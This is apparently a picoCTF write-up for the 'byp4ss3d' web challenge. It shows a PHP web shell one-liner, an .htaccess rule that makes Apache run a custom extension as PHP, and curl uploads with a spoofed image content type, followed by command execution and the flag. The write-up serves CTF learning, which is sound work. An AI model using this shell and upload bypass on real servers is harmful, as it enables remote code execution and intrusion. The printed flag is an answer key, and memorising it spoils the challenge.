<img width="1866" height="145" alt="屏幕截图 2025-10-12 235120" src="https://github.com/user-attachments/assets/7db259a7-5469-4bee-85e8-c904db93cf0f" /># byp4ss3d

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/6c81eebb-16b2-4cc8-9b03-58f8d9f79bac" />

**Tag:** `Web EXploitation`

**Description:** 
> A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't. You can access the web application at here!

**Attachments:** `http://amiable-citadel.picoctf.net:61584/`

**Hints:**

<details>
<summary>Hint 1</summary>

Apache can be tricked into executing non-PHP files as PHP with a `.htaccess` file.

</details>

<details>
<summary>Hint 2</summary>
  
Try uploading more than just one file.

</details>

**Author:** Yahaya Meddy

**Solved:** `510 users solved`

---

# Prologue

<img width="1863" height="1010" alt="image" src="https://github.com/user-attachments/assets/e605e0a8-ecd9-4204-835f-42b251e803b1" />

A UI is provided for uploading JPEG, PNG, and GIF files. This challenge is a file upload injection and remote code execution challenge.

<img width="500" height="246" alt="image" src="https://github.com/user-attachments/assets/14ee6d2d-6abc-494e-a7a7-41f073c0353c" />

Actually, there is a cool plot twist in this challenge🗿. I can't upload my shell file because of Windows🗿. Thank you Windows for making it difficult for me, so I'll upload it using curl.

# Exploitation

First, we'll create two different file types: .htaccess and shell.xyz. The extension you use is free; it doesn't have to be xyz, as we'll change it to php later in the .htaccess section.

```bash
 zsh >  echo '<?php system($_GET["cmd"]); ?>' > shell.xyz
```

After creating a non-exe shell because the file is not PHP, we will manipulate our shell file in .htaccess. Fill .htaccess with this script.

```bash
 zsh > echo 'AddType application/x-httpd-php .xyz' > .htaccess
```

Please adjust it to your respective extensions. Because I named my file shell.xyz, so I use .xyz. Next, we upload the 2 files by manipulating the Content-Type to contain image/jpeg. because windows has been giving me trouble. then I will upload it using curl

```bash
curl -X POST -F "image=@.htaccess;type=image/jpeg" http://amiable-citadel.picoctf.net:61584/upload.php
Successfully uploaded!<br>Access it at: <a href='images/.htaccess'>images/.htaccess</a>%  
```

```bash
curl -X POST -F "image=@shell.xyz;type=image/jpeg" http://amiable-citadel.picoctf.net:61584/upload.php
Successfully uploaded!<br>Access it at: <a href='images/shell.xyz'>images/shell.xyz</a>%  
```

After successfully logging in, we can open the browser and enter the URL like this

```
http://amiable-citadel.picoctf.net:61584/images/shell.xyz?cmd=id
```

<img width="500" height="98" alt="屏幕截图 2025-10-12 235022" src="https://github.com/user-attachments/assets/b7b6e0e6-9524-43ec-b4c9-15d764181529" />

and yes, our remote code execution was successful. Next, we look for where the flag is located. use this

```
http://amiable-citadel.picoctf.net:61584/images/shell.xyz?cmd=find+/+-name+*flag*+2%3E/dev/null
```

<img width="1000" height="226" alt="屏幕截图 2025-10-12 235058" src="https://github.com/user-attachments/assets/617ffdd7-2fea-430b-b484-38424313257b" />

So we got the location in /var/www/html. Next we just read the file.

<img width="1000" height="145" alt="屏幕截图 2025-10-12 235120" src="https://github.com/user-attachments/assets/9d8413ec-7357-4a39-9211-551ffe42c94a" />

---

# FLAG: picoCTF{s3rv3r_byp4ss_0c257942}
